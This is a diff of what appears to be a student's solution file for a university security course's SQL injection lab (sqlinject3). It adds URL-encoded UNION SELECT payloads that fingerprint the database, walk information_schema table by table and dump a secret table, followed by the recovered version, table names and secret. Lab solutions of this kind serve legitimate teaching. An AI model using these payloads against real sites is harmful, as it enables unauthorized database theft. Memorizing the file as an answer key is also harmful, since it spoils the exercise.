@@ -1,5 +1,54 @@
 https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+database%28%29%23
 https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+%40%40version%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+00%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+01%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+02%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+03%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+04%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+05%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+06%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+07%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+08%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+09%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+10%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+11%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+12%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+13%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+14%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+15%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+16%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+17%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+18%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+19%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+20%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+21%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+22%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+23%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+24%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+25%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+26%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+27%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+28%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+29%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+30%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+31%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+32%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+33%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+34%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+35%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+36%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+37%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+38%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+39%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+40%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+41%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+table_name+FROM+information_schema.tables+LIMIT+42%2C1%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+COUNT%28*%29+FROM+SECRETTABLE%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+COUNT%28*%29+FROM+information_schema.columns+WHERE+table_name+%3D+%27SECRETTABLE%27%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+NULL%2C+GROUP_CONCAT%28column_name%29+FROM+information_schema.columns+WHERE+table_name+%3D+%27SECRETTABLE%27%23
+https://eecs388.org/project2/sqlinject3/?id=%27+UNION+SELECT+NULL%2C+id%2C+secret+FROM+SECRETTABLE%23
 
 Name: proj2_xtra_cr3dit
 Version: 5.5.57-0ubuntu0.14.04.1
+Tables: CHARACTER_SETS, COLLATIONS, COLLATION_CHARACTER_SET_APPLICABILITY, COLUMNS, COLUMN_PRIVILEGES, ENGINES, EVENTS, FILES, GLOBAL_STATUS, GLOBAL_VARIABLES, KEY_COLUMN_USAGE, PARAMETERS, PARTITIONS, PLUGINS, PROCESSLIST, PROFILING, REFERENTIAL_CONSTRAINTS, ROUTINES, SCHEMATA, SCHEMA_PRIVILEGES, SESSION_STATUS, SESSION_VARIABLES, STATISTICS, TABLES, TABLESPACES, TABLE_CONSTRAINTS, TABLE_PRIVILEGES, TRIGGERS, USER_PRIVILEGES, VIEWS, INNODB_BUFFER_PAGE, INNODB_TRX, INNODB_BUFFER_POOL_STATS, INNODB_LOCK_WAITS, INNODB_CMPMEM, INNODB_CMP, INNODB_LOCKS, INNODB_CMPMEM_RESET, INNODB_CMP_RESET, INNODB_BUFFER_PAGE_LRU, SECRETTABLE, foo, inject3_users
+Secret: hunter2
